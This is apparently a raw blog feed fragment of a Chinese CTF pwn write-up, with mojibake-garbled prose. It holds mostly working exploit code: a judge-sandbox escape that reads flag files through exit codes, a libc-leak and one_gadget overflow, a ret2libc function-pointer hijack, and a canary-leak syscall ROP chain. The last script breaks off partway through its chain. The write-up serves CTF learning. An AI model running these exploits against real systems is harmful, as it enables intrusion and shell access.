(b&quot;/bin/bash&quot;,b&quot;-c&quot;,b&quot;&#123;command&#125;&quot;),</span><br><span class="hljs-string">    [b&quot;/bin/bash&quot;],</span><br><span class="hljs-string">    True,</span><br><span class="hljs-string">    (),</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    std_pipe[1], #c2pwrite</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    *(err_pipe),</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    -1,</span><br><span class="hljs-string">    None,</span><br><span class="hljs-string">    False,</span><br><span class="hljs-string">)</span><br><span class="hljs-string">time.sleep(0.1)</span><br><span class="hljs-string">content = os.read(std_pipe[0],1024)</span><br><span class="hljs-string">content_len = len(content)</span><br><span class="hljs-string"></span><br><span class="hljs-string">if &#123;loc&#125; &lt; content_len:</span><br><span class="hljs-string">    sys.exit(content[&#123;loc&#125;])</span><br><span class="hljs-string">else:</span><br><span class="hljs-string">    sys.exit(255)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>command=<span class="hljs-string">&quot;cat /flag*&quot;</span><br>received = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">254</span>):<br>    code = CODE_TEMPLATE.<span class="hljs-built_in">format</span>(loc=i,command=command)<br>    data = &#123;<span class="hljs-string">&quot;problem_id&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;code&quot;</span>:code&#125;<br>    resp = requests.post(URL,json=data)<br>    resp_data = resp.json()<br>    <span class="hljs-keyword">assert</span>(resp_data[<span class="hljs-string">&quot;status&quot;</span>] == <span class="hljs-string">&quot;RE&quot;</span>)<br>    ret_loc = resp_data[<span class="hljs-string">&quot;message&quot;</span>].find(<span class="hljs-string">&quot;ret=&quot;</span>)<br>    ret_code = resp_data[<span class="hljs-string">&quot;message&quot;</span>][ret_loc+<span class="hljs-number">4</span>:]<br>    <span class="hljs-keyword">if</span> ret_code == <span class="hljs-string">&quot;255&quot;</span>:<br>        <span class="hljs-keyword">break</span><br>    received += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(ret_code))<br>    <span class="hljs-built_in">print</span>(received)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹æ¯2024å†¬å­£èµ› pwn-wp</title>
    <link href="/2025/02/26/%E6%98%A5%E7%A7%8B%E6%9D%AF2024%E5%86%AC%E5%AD%A3%E8%B5%9B-pwn-wp/"/>
    <url>/2025/02/26/%E6%98%A5%E7%A7%8B%E6%9D%AF2024%E5%86%AC%E5%AD%A3%E8%B5%9B-pwn-wp/</url>
    
    <content type="html"><![CDATA[<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>é¦–å…ˆåœ¨æœ¬åœ°ç¯å¢ƒè°ƒè¯•æ—¶éœ€è¦æ‹Ÿé€ ä¸€ä¸ª.BYPASSæ–‡ä»¶ï¼Œåªè¦æ»¡è¶³æ¡ä»¶å³å¯ã€‚<br><code>main</code>å‡½æ•°å¯ä»¥leak puts, è¿›è€Œleak libcã€‚<code>0x400978</code>å¤„çš„å‡½æ•°å¯ä»¥æ ˆæº¢å‡ºï¼Œä½†ç”±äºè§0æˆªæ–­ï¼Œåªèƒ½ç”¨one_gadgetæ‰“ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&quot;pwn_patched&quot;</span><br>libcname = <span class="hljs-string">&quot;/home/zhangjuncpp/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6_2.27-3ubuntu1.6_amd64/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>host = <span class="hljs-string">&quot;47.94.155.240&quot;</span><br>port = <span class="hljs-number">22636</span><br>elf = context.binary = ELF(filename)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b main</span><br><span class="hljs-string"></span><br><span class="hljs-string">b *(0x400b6b)</span><br><span class="hljs-string">set debug-file-directory /home/zhangjuncpp/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/libc6-dbg_2.27-3ubuntu1.6_amd64/usr/lib/debug</span><br><span class="hljs-string">set directories /home/zhangjuncpp/.config/cpwn/pkgs/2.27-3ubuntu1.6/amd64/glibc-source_2.27-3ubuntu1.6_all/usr/src/glibc/glibc-2.27</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br>    <span class="hljs-keyword">elif</span> args.REMOTE:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br>pop_rdi = <span class="hljs-number">0x400df3</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br><br><br>io = start()<br>io.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;Invalid\n&quot;</span>)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; puts: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>libc.address = puts_addr - libc.sym.puts<br>one_gadget = libc.address + <span class="hljs-number">0x4f302</span><br>system_addr = libc.address + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc.address + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt; puts: <span class="hljs-subst">&#123;p16(<span class="hljs-number">526</span>+<span class="hljs-number">5</span>)&#125;</span>&quot;</span>)<br>io.send(<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">4</span>)<br>pause(<span class="hljs-number">1</span>)<br>rop_chain = p64(one_gadget)<br>str1 = (<span class="hljs-string">b&quot;KEY: &quot;</span>+ <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">19</span>+p16(<span class="hljs-number">526</span>+<span class="hljs-number">5</span>) + <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">8</span> + rop_chain).ljust(<span class="hljs-number">512</span> ,<span class="hljs-string">b&quot;d&quot;</span>)<br>payload = (<span class="hljs-string">b&quot;VAL: &quot;</span>).ljust(<span class="hljs-number">512</span> ,<span class="hljs-string">b&quot;d&quot;</span>)<br>io.send(str1)<br>pause(<span class="hljs-number">1</span>)<br>io.send(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="gender-simulation"><a href="#gender-simulation" class="headerlink" title="gender_simulation"></a>gender_simulation</h2><p>å¥³æ±‰å­<code>Tomboy</code>é€‰é¡¹æœ‰æ¼æ´(ä¸ºä»€ä¹ˆä¸æ˜¯å—æ¢é€‰é¡¹ğŸ˜­)ï¼Œä¼šå°†æ¥æ”¶åˆ°çš„å­—ç¬¦ä¸²å½“åšå‡½æ•°æŒ‡é’ˆè°ƒç”¨ï¼Œç¯¡æ”¹è‡³<code>gender</code>å‡½æ•°åæ‰“ret2libcå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    author: GeekCmore</span><br><span class="hljs-string">    time: 2025-01-17 11:28:01</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>filename = <span class="hljs-string">&quot;pwn_patched&quot;</span><br>libcname = <span class="hljs-string">&quot;/home/zhangjuncpp/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>host = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port = <span class="hljs-number">1337</span><br>elf = context.binary = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> libcname:<br>    libc = ELF(libcname)<br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *(0x402EA9)</span><br><span class="hljs-string">b *(0x4025e6)</span><br><span class="hljs-string">set debug-file-directory /home/zhangjuncpp/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6-dbg_2.39-0ubuntu8.3_amd64/usr/lib/debug</span><br><span class="hljs-string">set directories /home/zhangjuncpp/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/glibc-source_2.39-0ubuntu8.3_all/usr/src/glibc/glibc-2.39</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript = gs)<br>    <span class="hljs-keyword">elif</span> args.REMOTE:<br>        <span class="hljs-keyword">return</span> remote(host, port)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br>io = start()<br>io.recvuntil(<span class="hljs-string">b&quot;gift: &quot;</span>)<br>gift = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>libc_base = gift - libc.sym[<span class="hljs-string">&quot;setvbuf&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>log.success(<span class="hljs-string">f&quot;libc_base&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;Girl\n&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>io.sendlineafter(<span class="hljs-string">b&quot;Tomboy\n&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>back_addr = <span class="hljs-number">0x4025e6</span><br>io.sendlineafter(<span class="hljs-string">b&quot;certificate\n&quot;</span>, p64(back_addr))<br>pop_rdi = <span class="hljs-number">0x10f75b</span> + libc_base<br>ret = pop_rdi + <span class="hljs-number">1</span><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x10</span> + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">0x8</span> + p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)<br>io.sendafter(<span class="hljs-string">b&quot;certificate&quot;</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="eazy-http"><a href="#eazy-http" class="headerlink" title="eazy_http"></a>eazy_http</h2><p>æœ¬é¢˜ä¸»è¦éš¾ç‚¹æ˜¯é€†å‘ï¼Œpwnæ¼æ´ç‚¹å±äºç­¾åˆ°é¢˜çº§åˆ«ï¼Œæˆ‘è§‰å¾—è¿™é¢˜åº”è¯¥å‡ºRE()<br>æ³¨æ„åˆ°ä¸ä»…æ²¡ç»™libcï¼Œç”šè‡³æ•´ä¸ªç¨‹åºéƒ½æ²¡æœ‰pltè¡¨å’Œgotè¡¨ã€‚è¿™å®é™…ä¸Šæ˜¯å› ä¸ºç¨‹åºç›´æ¥é‡å†™äº†libcçš„å‡½æ•°å¹¶å†™æ­»åœ¨ç¨‹åºé‡Œï¼Œç„¶åå‰¥ç¦»ç¬¦å·è¡¨ï¼Œæé«˜äº†é€†å‘éš¾åº¦ã€‚<br>é€†å‘åˆ†æéƒ¨åˆ†å‚è€ƒè¿™ä½å¤§ä½¬çš„é¢˜è§£ï¼š<a href="https://xz.aliyun.com/news/16600">https://xz.aliyun.com/news/16600</a><br>ä¸è¿‡æˆ‘è°ƒè¯•æ—¶ä¸€ç›´åªæœ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸ä¸Šè¿°é¢˜è§£æƒ…å†µä¸åŒï¼Œå¯èƒ½æ˜¯æˆ‘çš„ç¯å¢ƒé—®é¢˜å§ã€‚<br>æ¼æ´ç‚¹æ˜¯æ ˆæº¢å‡ºã€‚æ³¨æ„ï¼Œç¨‹åºå®é™…ä¸Šæ˜¯æœ‰canaryä¿æŠ¤çš„ï¼Œéœ€è¦å¸¸è§„æ–¹æ³•æ³„éœ²canaryåå†æ‰“ä¸€æ¬¡ã€‚ç”±äºç¼ºå¤±libcï¼Œè¿™é‡Œçš„ROPéœ€è¦åˆ©ç”¨syscallæ‰“ï¼ŒROPé“¾å¾ˆé•¿ï¼Œä½†åŸºæœ¬ä¸ç”¨è‡ªå·±å†™ï¼Œ<strong>ROPgadgetä¸€æŠŠæ¢­å³å¯</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ./attachment --ropchain<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨è§£æè·¯å¾„æ—¶ä¼šæŠŠè·¯å¾„å­˜åˆ°æ ˆä¸Šï¼Œå¯æˆ‘ä»¬çš„ROPéƒ¨åˆ†æ¯åäº†æ ˆï¼Œéœ€è¦å¼„ä¸ªé•¿ç‚¹çš„popç»•è¿‡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> subprocess<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br><br>e = ELF(<span class="hljs-string">&quot;./attachment&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./attachment&quot;</span>)<br><span class="hljs-comment"># io = gdb.debug(&quot;./attachment&quot;, &quot;&quot;&quot;b *(0x40218f)</span><br><span class="hljs-comment">#                b *(0x401f71)</span><br><span class="hljs-comment">#                b *(0x401bd1)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br><br>template = <span class="hljs-string">&#x27;&#x27;&#x27;POST /&#123;&#125; HTTP/1.1\r</span><br><span class="hljs-string">Host: www.baidu.com\r</span><br><span class="hljs-string">User-Agent: Haha\r</span><br><span class="hljs-string">Content-Length: &#123;&#125;\r</span><br><span class="hljs-string">Content: &#123;&#125;\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    command = [<span class="hljs-string">&quot;ps&quot;</span>, <span class="hljs-string">&quot;-ax&quot;</span>]<br>    grep_command = [<span class="hljs-string">&quot;grep&quot;</span>, <span class="hljs-string">&quot;attachment&quot;</span>]<br>    <span class="hljs-comment"># æ‰§è¡Œ ps å‘½ä»¤</span><br>    ps_process = subprocess.Popen(command, stdout=subprocess.PIPE)<br>    <span class="hljs-comment"># å°† ps å‘½ä»¤çš„è¾“å‡ºä½œä¸º grep å‘½ä»¤çš„è¾“å…¥</span><br>    grep_process = subprocess.Popen(grep_command, stdin=ps_process.stdout, stdout=subprocess.PIPE)<br>    <span class="hljs-comment"># å…è®¸ ps å‘½ä»¤çš„è¾“å‡ºæµç›´æ¥ä¼ é€’åˆ° grep å‘½ä»¤</span><br>    ps_process.stdout.close()<br>    <span class="hljs-comment"># è·å–æœ€ç»ˆè¾“å‡º   </span><br>    output = grep_process.communicate()[<span class="hljs-number">0</span>]<br>    pid=<span class="hljs-built_in">int</span>(output.decode().split()[<span class="hljs-number">5</span>],<span class="hljs-number">10</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;pid:<span class="hljs-subst">&#123;pid&#125;</span>&quot;</span>)<br>    attach(pid)<br>    pause()<br>    <br>payload1=template.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;show&quot;</span>, <span class="hljs-number">0x109</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x109</span>).encode()<br><br><span class="hljs-comment"># debug()</span><br><span class="hljs-comment"># pause()</span><br>io.send(payload1)<br>io.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x108</span>)<br>canary = u64(io.recv(<span class="hljs-number">8</span>)) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;a&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;canary:<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br><br>bss = <span class="hljs-number">0x4e8b70</span><br><br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br>pop_r12_r13_r14_r15_rbp=<span class="hljs-number">0x000000000040545d</span><br>p=p64(pop_r12_r13_r14_r15_rbp)+(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x15</span> + <span class="hljs-string">b&#x27;/add\x00&#x27;</span>).ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a9ee</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000459227</span>) <span class="hljs-comment"># pop rax ; ret</span><br>p += <span class="hljs-string">b&#x27;/bin//sh&#x27;</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000045b995</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a9ee</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000447279</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000045b995</span>) <span class="hljs-comment"># mov qword ptr [rsi], rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040297f</span>) <span class="hljs-comment"># pop rdi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e0</span>) <span class="hljs-comment"># @ .data</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x000000000040a9ee</span>) <span class="hljs-comment"># pop rsi ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004a4c4b</span>) <span class="hljs-comment"># pop rdx ; pop rbx ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x00000000004e60e8</span>) <span class="hljs-comment"># @ .data + 8</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x4141414141414141</span>) <span class="hljs-comment"># padding</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000447279</span>) <span class="hljs-comment"># xor rax, rax ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; 